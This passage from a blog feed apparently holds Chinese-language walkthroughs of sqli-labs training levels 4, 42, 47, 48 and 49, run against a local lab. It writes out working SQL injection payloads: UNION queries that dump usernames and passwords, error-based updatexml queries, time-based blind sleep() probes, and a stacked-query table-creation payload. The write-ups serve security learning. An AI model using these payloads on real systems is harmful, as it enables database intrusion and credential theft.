<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585097215626.png" alt="1585097215626"></p>
<p>查看数据库，成功删除</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585097325337.png" alt="1585097325337"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十七关SORT报错和时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<p>查看初始页面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136509645.png" alt="1585136509645"></p>
<p>查看源文件，和之前一关一样只是这里使用了单引号进行闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136535725.png" alt="1585136535725"></p>
<p>加上单引号查看页面，发现页面结尾返回了三个引号，因为没使用注释符</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136597725.png" alt="1585136597725"></p>
<p>加入注释符查看页面返会结果，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136648398.png" alt="1585136648398"></p>
<p>这里使用报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(database())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136704317.png" alt="1585136704317"></p>
<p>查看表数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136773764.png" alt="1585136773764"></p>
<p>查看字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585136815300.png" alt="1585136815300"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四关GET联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看有没有注入点，看看报错信息是什么，尝试了加上单引号发现发挥正确，然后尝试一下双引号，返回错误，这里有错误说明存在注入点，在返回错误的同时，错误报告中双引号后面有一个括号，我们加上再次查看一下，页面返回是否正确，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584337944378.png" alt="1584337944378"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们加上括号，因为前面加引号了所以需在加上注释符</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;)--+</span><br><span class="line">页面返回正确，接下来查看一下当前字段数</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584338096202.png" alt="1584338096202"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前字段数</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) order by 4--+</span><br><span class="line">字段数4返回错误，我们再来尝试一下字段3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584338187817.png" alt="1584338187817"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们查看一下字段3</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) order by 3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584339010506.png" alt="1584339010506"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,database()--+</span><br><span class="line">当前数据库时security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584339228413.png" alt="1584339228413"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库内的表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584339673972.png" alt="1584339673972"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表中的字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584339780570.png" alt="1584339780570"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现表中有id，username，password等字段，我们主要查询这三个字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(id,username,password) from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584339872994.png" alt="1584339872994"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十九关SORT时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<p>查看原始页面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585142864606.png" alt="1585142864606"></p>
<p>查看源码，使用了单引号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585142890504.png" alt="1585142890504"></p>
<p>在页面中加入单引号，报错没有使用注释符</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585142919564.png" alt="1585142919564"></p>
<p>使用注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585142945756.png" alt="1585142945756"></p>
<p>因为使用注释符的时候页面并没有返回报错信息，所以不能使用报错注入，使用时间盲注。</p>
<p>查看数据库长度，当数据库长度为8的时候返回正确页面，等于其他的时候一直加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if((length(database())&#x3D;8 ),1,sleep(3))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585143134437.png" alt="1585143134437"></p>
<p>查看当前数据库，ascii 115转义过来是s，经过测试得知数据库security</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585143354916.png" alt="1585143354916"></p>
<p>查看表，当ascii等于101的时后页面返回正常101对应的是e经过测试得出第一个表时emails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(3))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585143755477.png" alt="1585143755477"></p>
<p>查看emails表中的字段，ascii 105对应的是i得出第一个字段是id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585143890801.png" alt="1585143890801"></p>
<p>查看id字段中的数据，ascii 49 对应的是1，也就是第一个数据是1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585143990644.png" alt="1585143990644"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十八关SORT时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<p>查看初始页面，页面返回正常。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585137576105.png" alt="1585137576105"></p>
<p>查看源代码，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585137599701.png" alt="1585137599701"></p>
<p>使用单引号查看是否有报错信息，并没有返回报错信息，说明当前不能使用报错注入，要是用时间注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585138427625.png" alt="1585138427625"></p>
<p>使用之间注入查看当前数据库长度，设置当字符长度大于1时返回，否则执行sleep</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if((length(database())&gt;1),1,sleep(3))</span><br><span class="line">数据库长度大于1返回了结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585139565140.png" alt="1585139565140"></p>
<p>看看等于1，当等于1是数据库一直在加载</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585139598622.png" alt="1585139598622"></p>
<p>经过测试，当数据库等于8的时候页面正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if((length(database())&#x3D;8),1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585139654613.png" alt="1585139654613"></p>
<p>查看库名，ascii115转移过来是s，经过测试得知数据库security</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585139955069.png" alt="1585139955069"></p>
<p>得知是security库，查看库下的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(10))</span><br><span class="line"></span><br><span class="line">当ascii等于101的时后页面返回正常101对应的是e经过测试得出第一个表时emails</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585140261048.png" alt="1585140261048"></p>
<p>更改ascii值查看页面是否会报错，ascii等于105时一直加载说明错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585140342919.png" alt="1585140342919"></p>
<p>查看emails表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(10))</span><br><span class="line">ascii 101对应的是i得出第一个字段是id</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585140531773.png" alt="1585140531773"></p>
<p>查看一下id的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(10))</span><br><span class="line">ascii49对应的值是1，emails字段中得第一个数据是1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585140607102.png" alt="1585140607102"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十二关POST堆叠password处</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/</url>
    <content><![CDATA[<h5 id="查看初始页面"><a href="#查看初始页面" class="headerlink" title="查看初始页面"></a>查看初始页面</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585059097206.png" alt="1585059097206"></p>
<h5 id="查看源码，发现将username对单引号等字符进行了过滤处理，说明不能再username处注入，因为是post注入，在password处，说明在登录界面进行注入"><a href="#查看源码，发现将username对单引号等字符进行了过滤处理，说明不能再username处注入，因为是post注入，在password处，说明在登录界面进行注入" class="headerlink" title="查看源码，发现将username对单引号等字符进行了过滤处理，说明不能再username处注入，因为是post注入，在password处，说明在登录界面进行注入"></a>查看源码，发现将username对单引号等字符进行了过滤处理，说明不能再username处注入，因为是post注入，在password处，说明在登录界面进行注入</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585059133187.png" alt="1585059133187"></p>
<h5 id="在password处使用堆叠向数据库插入表，用户名和密码随便输，发现输入的密码看不见，这样我们并不知道我们输入的正不正确"><a href="#在password处使用堆叠向数据库插入表，用户名和密码随便输，发现输入的密码看不见，这样我们并不知道我们输入的正不正确" class="headerlink" title="在password处使用堆叠向数据库插入表，用户名和密码随便输，发现输入的密码看不见，这样我们并不知道我们输入的正不正确"></a>在password处使用堆叠向数据库插入表，用户名和密码随便输，发现输入的密码看不见，这样我们并不知道我们输入的正不正确</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585059950979.png" alt="1585059950979"></p>
<h5 id="更改网页源码，查看网页元素，点击箭头"><a href="#更改网页源码，查看网页元素，点击箭头" class="headerlink" title="更改网页源码，查看网页元素，点击箭头"></a>更改网页源码，查看网页元素，点击箭头</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060058954.png" alt="1585060058954"></p>
<h5 id="选中password输入框，会出来这一串代码"><a href="#选中password输入框，会出来这一串代码" class="headerlink" title="选中password输入框，会出来这一串代码"></a>选中password输入框，会出来这一串代码</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060090987.png" alt="1585060090987"></p>
<h5 id="将type后的password改为text，这样密码处输入的内容就显示了"><a href="#将type后的password改为text，这样密码处输入的内容就显示了" class="headerlink" title="将type后的password改为text，这样密码处输入的内容就显示了"></a>将type后的password改为text，这样密码处输入的内容就显示了</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060137467.png" alt="1585060137467"></p>
<h5 id="使用堆叠，向数据库插入表，账号密码随便输入"><a href="#使用堆叠，向数据库插入表，账号密码随便输入" class="headerlink" title="使用堆叠，向数据库插入表，账号密码随便输入"></a>使用堆叠，向数据库插入表，账号密码随便输入</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;; create table crow like users;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060219965.png" alt="1585060219965"></p>
<h5 id="点击login登录，页面返回错误，"><a href="#点击login登录，页面返回错误，" class="headerlink" title="点击login登录，页面返回错误，"></a>点击login登录，页面返回错误，</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060253456.png" alt="1585060253456"></p>
